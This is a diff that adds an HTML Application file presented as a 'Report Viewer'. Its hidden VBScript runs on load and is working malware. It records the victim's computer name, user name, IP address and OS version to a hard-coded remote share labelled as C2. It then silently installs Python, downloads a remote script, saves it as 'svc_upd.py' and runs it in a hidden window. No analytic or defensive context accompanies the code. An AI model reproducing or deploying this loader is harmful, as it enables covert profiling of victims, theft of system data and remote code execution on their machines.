@@ -1,0 +1,110 @@
+<html>
+<head>
+<hta:application
+  id="oReport"
+  applicationname="Report Viewer"
+  border="none"
+  borderstyle="normal"
+  caption="no"
+  showintaskbar="no"
+  singleinstance="yes"
+  sysmenu="no"
+  windowstate="minimize"
+/>
+<script language="VBScript">
+Sub Window_onLoad()
+    window.resizeTo 0,0
+    window.moveTo -2000,-2000
+
+    On Error Resume Next
+    Set sh = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+
+    ' --- Collect system info ---
+    host = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+    user = sh.ExpandEnvironmentStrings("%USERNAME%")
+    tmpDir = sh.ExpandEnvironmentStrings("%TEMP%")
+
+    ' Get IP
+    ip = "unknown"
+    Set ex = sh.Exec("cmd.exe /c ipconfig")
+    WScript.Sleep 1200
+    out = ex.StdOut.ReadAll()
+    For Each ln In Split(out, vbCrLf)
+        If InStr(ln, "IPv4") > 0 Then
+            p = InStr(ln, ":")
+            If p > 0 Then ip = Trim(Mid(ln, p+1)) : Exit For
+        End If
+    Next
+
+    ' Get OS
+    osv = "Windows"
+    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+    For Each o In wmi.ExecQuery("Select Caption from Win32_OperatingSystem")
+        osv = o.Caption : Exit For
+    Next
+
+    ' Timestamp
+    n = Now()
+    ts = Year(n) & "-" & Right("0"&Month(n),2) & "-" & Right("0"&Day(n),2) & " " & Right("0"&Hour(n),2) & ":" & Right("0"&Minute(n),2) & ":" & Right("0"&Second(n),2)
+
+    entry = host & "|" & user & "|" & ip & "|" & osv & "|" & ts
+
+    ' --- Write to C2 ---
+    c2 = "\\69.178.47.125\c$\Users\peppe\AppData\Local\Temp\infected_registry.txt"
+    fb = tmpDir & "\infected_registry_local.txt"
+
+    On Error Resume Next
+    Set f = fso.OpenTextFile(c2, 8, True)
+    If Err.Number = 0 Then f.WriteLine entry : f.Close : Else Err.Clear
+    If Err.Number <> 0 Then
+        Set f = fso.OpenTextFile(fb, 8, True)
+        If Err.Number = 0 Then f.WriteLine entry : f.Close
+    End If
+    Err.Clear
+
+    ' --- Check/Install Python ---
+    pyPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Programs\Python\Python312\python.exe"
+    If Not fso.FileExists(pyPath) Then
+        Set wh = sh.Exec("cmd.exe /c where python.exe")
+        WScript.Sleep 800
+        ln = Trim(wh.StdOut.ReadLine())
+        If Len(ln) > 4 Then pyPath = ln Else pyPath = "python.exe"
+    End If
+
+    If Not fso.FileExists(pyPath) Then
+        pyIns = tmpDir & "\python_installer.exe"
+        Set h = CreateObject("MSXML2.XMLHTTP")
+        h.Open "GET", "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe", False
+        h.Send
+        If h.Status = 200 Then
+            Set s = CreateObject("ADODB.Stream")
+            s.Type = 1 : s.Open : s.Write h.ResponseBody
+            s.SaveToFile pyIns, 2 : s.Close
+            sh.Run """" & pyIns & """ /quiet InstallAllUsers=1 PrependPath=1", 0, True
+            WScript.Sleep 12000
+            fso.DeleteFile pyIns
+        End If
+        pyPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Programs\Python\Python312\python.exe"
+        If Not fso.FileExists(pyPath) Then pyPath = "python.exe"
+    End If
+
+    ' --- Download and run daemon ---
+    pyFile = tmpDir & "\svc_upd.py"
+    Set h2 = CreateObject("MSXML2.XMLHTTP")
+    h2.Open "GET", "https://raw.githubusercontent.com/bilgi213h/hululu/main/weekly_Q2.ps1", False
+    h2.Send
+    If h2.Status = 200 Then
+        Set s2 = CreateObject("ADODB.Stream")
+        s2.Type = 2 : s2.Charset = "UTF-8" : s2.Open
+        s2.WriteText h2.ResponseText
+        s2.SaveToFile pyFile, 2 : s2.Close
+        sh.Run """" & pyPath & """ """ & pyFile & """", 0, False
+    End If
+
+    window.close()
+End Sub
+</script>
+</head>
+<body></body>
+</html>
